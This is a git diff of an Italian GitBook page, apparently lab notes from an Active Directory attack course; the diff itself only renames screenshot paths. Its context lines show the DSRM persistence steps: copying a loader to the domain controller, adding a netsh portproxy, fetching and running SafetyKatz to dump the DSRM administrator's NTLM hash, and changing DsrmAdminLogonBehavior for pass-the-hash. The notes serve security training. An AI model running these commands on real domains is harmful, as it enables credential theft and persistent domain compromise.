@@ -20,7 +20,7 @@ Nel nuovo processo spawnato copiamo il Loader&#x20;
 echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Accediamo il dc  con winrs e aggiungiamo l'interfaccia portproxy&#x20;
 
@@ -32,7 +32,7 @@ winrs -r:dcorp-dc cmd
 netsh interface portproxy add v4tov4 listenport=8080 listenadress=0.0.0.0 connectport=80 connectaddress=172.16.100.60
 ```
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 A questo punto eseguiamo SafetyKatz per recuperare l'hash del  administrator DRM
 
@@ -40,7 +40,7 @@ A questo punto eseguiamo SafetyKatz per recuperare l'hash del  administrator DRM
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "token::elevate" "lsadump::evasive-sam" "exit"
 ```
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Abbiamo l'hash NTLM&#x20;
 
@@ -53,7 +53,7 @@ L'amministratore DSRM non è autorizzato ad accedere al DC dalla rete. È quindi
 reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
 ```
 
-<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Ora sulla VM dello studente, possiamo usare Pass-The-Hash (non OverPass-The-Hash) per l'amministratore DSRM:
 
